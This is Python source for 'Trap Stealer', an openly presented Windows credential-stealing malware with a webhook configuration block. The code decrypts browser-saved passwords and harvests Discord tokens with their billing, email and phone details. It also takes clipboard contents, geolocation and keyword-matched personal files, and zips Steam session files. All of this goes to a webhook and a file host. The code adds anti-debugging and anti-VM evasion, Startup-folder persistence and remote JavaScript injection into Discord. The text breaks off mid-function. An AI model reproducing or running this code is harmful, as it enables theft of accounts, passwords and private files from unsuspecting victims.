# Import dont mind

import os, base64
from os import getenv, startfile
import threading
from sys import executable
import re
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
import urllib.request
from json import loads, dumps
import time
from zipfile import ZipFile
import re
import subprocess
import socket, getpass, ctypes
from PIL import ImageGrab
import platform
from shutil import copy
from os.path import isfile, join
import winreg, random
from sqlite3 import connect as sql_connect
import win32crypt
import requests
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads as json_loads
import os, os.path, zipfile
import shutil, json
import win32clipboard
### CONFIG ### 
webhook = '' #Put ur webhook

injection = False # If set to False it will not inject into discord
fakeerror = False # If True it will make an fake error message at the end
Startup = False # If True it will add the file into the startup folder
shitty_message = False # If True it will print fake message, if you want to disable it replace with False
antidebugging = False # If set to false it will dont check for VM or Debugger
DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from index.js #----- IT WILL DISABLE INJECTION -----#

StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True

def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)

def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Ip Blacklisted')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('Detected Vm')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('Detected Vm')


try:
    if antidebugging == True:
        antidebug()
    else:
        pass
except:
    pass

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

    # ---------------------------------------------------------------

if shitty_message == True:
    print('Importing Module...')
else:
    pass

file_path = os.path.realpath(__file__)
USER_NAME = getpass.getuser()


from ctypes import *
from Crypto.Cipher import AES


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', c_ulong),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = create_string_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = create_string_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    

def Clipboard():
  win32clipboard.OpenClipboard()
  clipboard_data = win32clipboard.GetClipboardData()
  win32clipboard.CloseClipboard()

  return clipboard_data

try:
    clipboardtext = Clipboard()
except:
    clipboardtext = 'Could not get the data | Empty or an image'
path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"

def startup():
    global StartupMessage
    StartupMessage = 'Sucessfully added to startup'
    if not isfile(path):
        copy(__file__, path)
        with open(path, 'r+b') as f:
            content = f.read()
            f.seek(0)
            f.write(content.replace(b"fakeerror = True", b"fakeerror = False"))
            f.truncate()
    else:
        if __file__.replace('\\', '/') != path.replace('\\', '/'):
            pass


try:
    if Startup == True:
        startup()
    else:
        pass
except:
    pass


def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

requirements = [
    ["requests", "requests"],["Crypto.Cipher", "pycryptodome"]
]

import requests
from Crypto.Cipher import AES

for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1];Dscdev = 'tnempoleveDdrocsiD'[::-1]
def NoDiscord():
    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
    for folder_name in folder_list:
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file == 'index.js' and 'discord_desktop_core-' in root:
                        file_path = os.path.join(root, file)
                        with open(file_path, "w+", encoding="utf-8") as f:
                            f.write('error')

try:
    if NoDiscord == True:
        NoDiscord()
        injection = False
    else:
        pass
except:
    pass

#Do not touch
inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js"



def inj_discord():
    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
    for folder_name in reversed(folder_list):
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file == 'index.js' and 'discord_desktop_core-' in root:
                        file_path = os.path.join(root, file)
                        inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(inj_content)

if injection == True:
    try:

        inj_discord()

    except:pass

else:pass

def systemInfo():
    system = platform.system()
    node_name = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    username = os.getlogin() if os.name == "nt" else os.getenv("USER")
    home_dir = os.path.expanduser("~")

    sys_info = f"System information:\n`{system}`\nNode name: `{node_name}`\nRelease: `{release}`\nVersion: `{version}`\nMachine: `{machine}`\nProcessor: `{processor}`\nHome directory: `{home_dir}`\n"

    return sys_info

def globalInfo():
    url = 'https://ipinfo.io/json'
    response = urllib.request.urlopen(url)
    data = json.load(response)
    ip = data['ip']
    loc = data['loc']
    location = re.findall(r'\d+.\d+', loc)
    latitude = location[0]
    longitude = location[1]
    username = os.getlogin()
    country = data['country']
    country_code = data['country'].lower()
    region = data['region']
    city = data['city']
    postal = data['postal']
    computer_name = socket.gethostname()
    cores = os.cpu_count()
    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()

    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
    return globalinfo

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://checkip.amazonaws.com")).read().decode().strip()
    except:
        pass
    return ip


ip = getip()
globalinfo = globalInfo()


# ALL PATH
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
home_dir = os.path.expanduser('~')
home_dir = os.path.expanduser('~')
desktop_path = os.path.join(home_dir, 'Desktop')
downloads_path = os.path.join(home_dir, 'Downloads')
documents_path = os.path.join(home_dir, 'Documents')
pictures_path = os.path.join(home_dir, 'Pictures')


Threadlist = []

# Discord Badge
badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]

if shitty_message == True:
    print('Adding Requests...')
else:
    pass



def GetUHQFriends(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    try:
        friendslist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendslist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
    return uhqlist



def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]
    return OwnedBadges

def GetTokqInfo(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())

    username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-"

    if "premium_type" in UserInfo: 
        nitros = UserInfo["premium_type"]
        if nitros == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitros == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in UserInfo:
        phone = f'`{UserInfo["phone"]}`'

    return username, hashtag, email, id, pfp, flags, nitro, phone

def checkTokq(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def GetBilling(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        with urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)) as response:
            billing_json = loads(response.read().decode())
    except:
        return False
    
    if not billing_json:
        return " -"

    billing = ""
    for method in billing_json:
        if not method["invalid"]:
            if method["type"] == 1:
                billing += ":credit_card:"
            elif method["type"] == 2:
                billing += ":parking: "

    return billing



def uploadTokq(Tokq, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokqInfo(Tokq)

    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"

    billing = GetBilling(Tokq);badge = GetBadge(flags);friends = GetUHQFriends(Tokq)

    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"
    tok = 'nekoT'
    data = {
        "username": "Trap Stealer",
        "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
        "content": "",
        "embeds": [
            {
                "title": f"🍪 Trap Stealer {tok[::-1]}",
                "description": f"`{path}` :\n",
                "color": 0xffb6c1,
                "author": {
                    "name": f"{username}#{hashtag} ({user_id})",
                    "icon_url": pfp
                },
                "footer": {
                    "text": "Trap Stealer",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                },
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "fields": [
                    {
                        "name": f"✨ {tok[::-1]}:",
                        "value": f"`{Tokq}`"
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": phone,
                        "inline": True
                    },
                    {
                        "name": ":envelope: Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": billing,
                        "inline": True
                    },
                    {
                        "name": "🔮 HQ Friends:",
                        "value": friends,
                        "inline": False
                    }
                    
                ]
            }
        ],
        "attachments": []
    }

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
def upload_file(file_path):
    try:
        response = requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={'file': open(file_path, 'rb')}

        )

        return response.json()["data"]["downloadPage"]
    
    except:

        return False




Tokqs = ''
def getTokq(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for Tokq in re.findall(regex, line):
                        global Tokqs
                        if checkTokq(Tokq):
                            if not Tokq in Tokqs:
                                Tokqs += Tokq
                                uploadTokq(Tokq, path)

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokqs
                    TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkTokq(TokqDecoded):
                        if not TokqDecoded in Tokqs:
                            Tokqs += TokqDecoded
                            uploadTokq(TokqDecoded, path)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Trap Stealer\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

paswWords = []
Passw = []
PasswCount = 0
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

sysinfo = systemInfo()
data = {
    "username": "Trap Stealer",
    "content": "@everyone someone launched it",
    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
    "embeds": [
        {
            "title": "🍪 Trap Stealer Information",
            "description": f"{globalinfo}\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : {StartupMessage}\nClipboard text : ```{clipboardtext}```",
            "color": 0xffb6c1,
            "thumbnail": {
                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
            },
            "footer": {
                "text": "Trap Stealer | https://github.com/TheCuteOwl",
                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
            }
        }
    ]
}

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }


LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

if shitty_message == True:
    print('Everything Installed...')
else:
    pass


def GatherAll():
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
    ]
    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]
    for patt in browserPaths:
        a = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)
    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    # execute passw() after GatherAll() is done
    for thread in Threadlist:
        thread.join()
    file = os.getenv("TEMP") + f"\wppassw.txt"; filename = "wppassw.txt"

    a = upload_file(file)
    embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]

    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Password",
                "description": "Password",
                "color": 0xffb6c1,
                "fields": embed_fields,
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "footer": {
                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                }
            }
        ]
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)





keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

GatherAll() 

""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

######################################################
keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
extension = ".txt"


import concurrent.futures

file_paths = []

for path in [desktop_path, downloads_path, documents_path, pictures_path]:
    for file in os.listdir(path):
         if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
                file_path = os.path.join(path, file) 
                file_paths.append(file_path)


urls = []

with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = []
    for file_path in file_paths:
        futures.append(executor.submit(upload_file, file_path))
    for future, file_path in zip(futures, file_paths):
        url = future.result()
        if url:
            urls.append((os.path.basename(file_path), url))
        else:
            pass



if urls:
    embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]

    data = {
        "username": "Trap Stealer",
        "content": "",
        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
        "embeds": [
            {
                "title": "🍪 Trap Stealer Files",
                "description": "New files have been uploaded:",
                "color": 0xffb6c1,
                "fields": embed_fields,
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "footer": {
                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                }
            }
        ]
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

user = os.path.expanduser("~")

def steam_st():
    steam_path = ""
    if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
        steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
        ssfn = []
        config = ""
        for file in os.listdir(steam_path):
            if file[:4] == "ssfn":
                ssfn.append(steam_path+f"\\{file}")
        def steam(path,path1,steam_session):
            for root,dirs,file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root+"\\"+file)
            for file2 in path1:
                steam_session.write(file2)
        if os.path.exists(steam_path+"\\config"):
            with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                steam(steam_path+"\\config",ssfn,zp)

            headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                } 
            
            data = {
            "username": "Trap Stealer",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [

                {
                    "title": "🎮 Trap Stealer Steam Session",
                    "description": f"Steam session taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
